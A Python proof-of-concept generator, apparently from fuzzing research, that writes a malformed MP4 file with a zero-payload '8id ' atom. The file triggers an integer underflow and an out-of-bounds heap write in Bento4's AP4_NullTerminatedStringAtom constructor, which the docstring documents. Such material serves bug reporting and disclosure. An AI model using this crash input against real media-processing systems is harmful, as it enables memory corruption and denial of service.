#!/usr/bin/env python3
"""
PoC generator for VULN 001:
AP4_NullTerminatedStringAtom – Heap OOB Write via Integer Underflow (size == 8)

Root cause: In AP4_NullTerminatedStringAtom constructor (Ap4Atom.cpp:471-474),
  str_size = (AP4_Size)size - AP4_ATOM_HEADER_SIZE
When size == 8, str_size == 0. Then:
  char* str = new char[0];    // zero-length heap allocation
  str[str_size-1] = '\0';     // str[0xFFFFFFFF] = OOB write (AP4_Size is uint32)
ASAN will report heap-buffer-overflow.

The atom type AP4_ATOM_TYPE_8ID_ = AP4_ATOM_TYPE('8','i','d',' ')
= bytes: 0x38 0x69 0x64 0x20
"""

import struct
import os

OUT_DIR = "/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4Atom_h"
OUT_FILE = os.path.join(OUT_DIR, "vuln_001.mp4")

def make_box(box_type_bytes, payload=b""):
    """Create an MP4 box: 4-byte big-endian size + 4-byte type + payload."""
    assert len(box_type_bytes) == 4
    size = 8 + len(payload)
    return struct.pack(">I", size) + box_type_bytes + payload

# ftyp box: size=16, type='ftyp', major_brand='isom', minor_version=0
ftyp_payload = b"isom" + struct.pack(">I", 0)  # major_brand + minor_version
ftyp_box = make_box(b"ftyp", ftyp_payload)

# 8id  box with size exactly 8 (no payload) — triggers the OOB write
# AP4_ATOM_TYPE_8ID_ = AP4_ATOM_TYPE('8','i','d',' ') = 0x38, 0x69, 0x64, 0x20
eight_id_type = bytes([0x38, 0x69, 0x64, 0x20])  # '8', 'i', 'd', ' '
eight_id_box = make_box(eight_id_type, b"")  # size=8, no payload

mp4_data = ftyp_box + eight_id_box

os.makedirs(OUT_DIR, exist_ok=True)
with open(OUT_FILE, "wb") as f:
    f.write(mp4_data)

print(f"Written {len(mp4_data)} bytes to {OUT_FILE}")
print(f"  ftyp box: {len(ftyp_box)} bytes")
print(f"  8id  box: {len(eight_id_box)} bytes (size=8, no payload)")
print(f"  8id  type bytes: {' '.join(f'0x{b:02x}' for b in eight_id_type)}")
